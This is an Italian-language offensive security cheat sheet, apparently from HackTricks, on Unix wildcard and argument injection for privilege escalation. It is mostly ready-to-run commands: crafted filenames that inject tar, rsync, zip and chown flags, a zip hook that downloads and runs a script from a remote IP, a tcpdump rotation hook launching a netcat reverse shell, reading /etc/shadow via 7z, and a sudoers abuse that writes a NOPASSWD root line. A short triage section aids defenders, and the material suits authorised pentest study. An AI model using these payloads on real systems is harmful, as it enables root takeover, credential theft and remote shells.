# Trucchi extra con Wildcards

{{#include ../../banners/hacktricks-training.md}}

> La **argument injection** tramite Wildcard (aka *glob*) si verifica quando uno script con privilegi esegue un binary Unix come `tar`, `chown`, `rsync`, `zip`, `7z`, … con un wildcard non racchiuso tra virgolette come `*`.
> Poiché la shell espande il wildcard **prima** di eseguire il binary, un attacker che può creare file nella working directory può creare filename che iniziano con `-`, in modo che vengano interpretati come **opzioni invece che dati**, consentendo di fatto di introdurre flag arbitrari o persino comandi.
> Questa pagina raccoglie le primitive più utili, le ricerche recenti e i modern detection aggiornati per il 2023-2025.

## chown / chmod

È possibile **copiare il proprietario/gruppo o i permission bits di un file arbitrario** abusando del flag `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Quando in seguito root esegue qualcosa come:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` viene iniettato, causando l'ereditarietà della proprietà e dei permessi di `/root/secret``file` da parte di *tutti* i file corrispondenti.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (attacco combinato).
Vedi anche il classico paper di DefenseCode per maggiori dettagli.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Esegui comandi arbitrari abusando della funzionalità **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Una volta che root esegue, ad esempio, `tar -czf /root/backup.tgz *`, `shell.sh` viene eseguito come root.

### bsdtar / macOS 14+

Il `tar` predefinito nelle versioni recenti di macOS (basato su `libarchive`) non implementa `--checkpoint`, ma è comunque possibile ottenere l'esecuzione di codice con il flag **--use-compress-program**, che consente di specificare un compressore esterno.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Quando uno script privilegiato esegue `tar -cf backup.tar *`, verrà avviato `/bin/sh`.

---

## rsync

`rsync` consente di sovrascrivere la shell remota o persino il binario remoto tramite flag della riga di comando che iniziano con `-e` o `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Se in seguito root archivia la directory con `rsync -az * backup:/srv/`, il flag iniettato avvia la tua shell sul lato remoto.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (modalità `rsync`).

---

## 7-Zip / 7z / 7za

Anche quando lo script privilegiato antepone *difensivamente* il prefisso `--` al wildcard (per impedire il parsing delle opzioni), il formato 7-Zip supporta i **file elenco** anteponendo `@` al nome del file. Combinando questo con un symlink, puoi *esfiltrare file arbitrari*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Se root esegue qualcosa come:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip tenterà di leggere `root.txt` (→ `/etc/shadow`) come file list e terminerà, **stampando il contenuto su stderr**.

Questo funziona anche con `-- *` perché la CLI di 7-Zip accetta esplicitamente sia nomi di file normali sia `@listfiles` come input posizionali, quindi un nome letterale come `@root.txt` viene comunque trattato in modo speciale.

---

## zip

Esistono due primitive molto pratiche quando un'applicazione passa a `zip` nomi di file controllati dall'utente (tramite un wildcard oppure enumerando i nomi senza `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE tramite test hook: `-T` abilita il “test archive” e `-TT <cmd>` sostituisce il tester con un programma arbitrario (forma estesa: `--unzip-command <cmd>`). Se puoi iniettare nomi di file che iniziano con `-`, suddividi i flag tra nomi di file distinti affinché il parsing delle short options funzioni:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Note
- NON provare a usare un singolo filename come `'-T -TT <cmd>'` — le short options vengono analizzate carattere per carattere e l'operazione fallirà. Usa token separati come mostrato.
- Se gli slash vengono rimossi dai filename dall'app, esegui il fetch da un host/IP bare (percorso predefinito `/index.html`) e salva localmente con `-O`, quindi esegui.
- Puoi eseguire il debug del parsing con `-sc` (mostra gli argv elaborati) o `-h2` (ulteriore help) per capire come vengono consumati i tuoi token.

Example (comportamento locale su zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Se il layer web restituisce lo stdout/stderr di `zip` (comune nei wrapper ingenui), i flag iniettati come `--help` o gli errori dovuti a opzioni errate appariranno nella risposta HTTP, confermando la command-line injection e facilitando la messa a punto del payload.

---

## Binaries aggiuntivi vulnerabili alla wildcard injection (lista rapida 2023-2025)

I seguenti comandi sono stati abusati nei CTF moderni e in ambienti reali. Il payload viene sempre creato come un *filename* all'interno di una directory scrivibile che verrà successivamente elaborata con una wildcard:

| Binary | Flag da abusare | Effetto |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Leggere il contenuto di un file |
| `flock` | `-c <cmd>` | Eseguire un comando |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution tramite git over SSH |
| `scp`   | `-S <cmd>` | Avviare un programma arbitrario al posto di ssh |

Queste primitive sono meno comuni dei classici *tar/rsync/zip*, ma vale la pena controllarle durante la ricerca.

---

## Ricerca di wrapper e job vulnerabili

Recenti case study hanno mostrato che la wildcard/argv injection non è più soltanto un problema di **cron + tar**.<sup>[[5]](#references)</sup> La stessa classe di bug continua a comparire in:

- funzionalità web che "scaricano tutto come zip/tar" da directory di upload controllate dall'attaccante
- debug shell di vendor/appliance che espongono un wrapper **tcpdump** con campi filename/filter controllati dall'attaccante
- job di backup o rotation che eseguono `tar`, `rsync`, `7z`, `zip`, `chown` o `chmod` su directory scrivibili

Comandi utili per il triage:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Euristiche rapide:

- `-- *` è una buona soluzione per molti strumenti GNU, ma **non** per `7z`/`7za`, perché `@listfiles` viene analizzato separatamente.
- Per `zip`, cerca wrapper che enumerano direttamente i filenames controllati dall'utente; lo short-option splitting (`-T` + `-TT <cmd>`) funziona ancora anche senza una shell glob.
- Per `tcpdump`, presta particolare attenzione ai wrapper che consentono di controllare i **nomi dei file di output**, le **impostazioni di rotation** o gli argomenti di **replay dei capture file**.

---

## tcpdump rotation hooks (-G/-W/-z): RCE tramite argv injection nei wrapper

Quando una restricted shell o un vendor wrapper costruisce una command line di `tcpdump` concatenando campi controllati dall'utente (ad esempio un parametro "file name") senza un quoting/validation rigoroso, è possibile inserire di nascosto flag aggiuntivi di `tcpdump`. La combinazione di `-G` (rotation basata sul tempo), `-W` (limite al numero di file) e `-z <cmd>` (comando post-rotation) consente l'esecuzione arbitraria di comandi con i privilegi dell'utente che esegue tcpdump (spesso root sugli appliance).<sup>[[1]](#references)[[4]](#references)</sup>

Prerequisiti:

- Puoi influenzare l'`argv` passato a `tcpdump` (ad esempio tramite un wrapper come `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Il wrapper non sanifica gli spazi o i token con prefisso `-` nel campo del file name.

PoC classico (esegue uno script reverse shell da un percorso writable):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Dettagli:

- `-G 1 -W 1` forza una rotazione immediata dopo il primo pacchetto corrispondente.
- `-z <cmd>` esegue il comando post-rotazione una volta per ogni rotazione. Molte build eseguono `<cmd> <savefile>`. Se `<cmd>` è uno script/interprete, assicurati che la gestione degli argomenti corrisponda al tuo payload.

Varianti senza supporti rimovibili:

- Se disponi di un altro primitive per scrivere file (ad esempio, un wrapper di comando separato che consente il reindirizzamento dell'output), inserisci lo script in un percorso noto e attiva `-z /bin/sh /path/script.sh` oppure `-z /path/script.sh`, a seconda della semantica della piattaforma.
- Alcuni wrapper dei vendor ruotano i file verso posizioni controllabili dall'attacker. Se puoi influenzare il percorso ruotato (symlink/directory traversal), puoi indirizzare `-z` in modo da eseguire contenuto completamente sotto il tuo controllo senza supporti esterni.

---

## sudoers: tcpdump con wildcard/argomenti aggiuntivi → scrittura/lettura arbitrarie e root

Anti-pattern molto comune in sudoers:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Problemi
- Il glob `*` e i pattern permissivi limitano solo il primo argomento `-w`. `tcpdump` accetta più opzioni `-w`; prevale l'ultima.
- La regola non vincola le altre opzioni, quindi sono consentite `-Z`, `-r`, `-V`, ecc.

Primitive
- Sovrascrivere il path di destinazione con un secondo `-w` (il primo soddisfa solo sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal all'interno del primo `-w` per uscire dall'albero vincolato:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Forza la proprietà dei file di output con `-Z root` (crea file di proprietà di root ovunque):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Scrittura di contenuto arbitrario riproducendo un PCAP appositamente creato tramite `-r` (ad esempio, per inserire una riga in sudoers):

<details>
<summary>Crea un PCAP contenente l'esatto payload ASCII e scrivilo come root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Lettura arbitraria di file/secret leak con `-V <file>` (interpreta un elenco di savefile). Le diagnostiche degli errori spesso ripetono le righe, causando un leak del contenuto:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Riferimenti

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: iniezione di argomenti di zip fino a RCE + escalation dei privilegi tramite errata configurazione di tcpdump sudo](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Catena di exploit completa](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Rilevata potenziale shell tramite iniezione di wildcard](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Ritorno al futuro: le wildcard Unix scatenate (DefenseCode)](https://www.exploit-db.com/papers/33930)

{{#include ../../banners/hacktricks-training.md}}
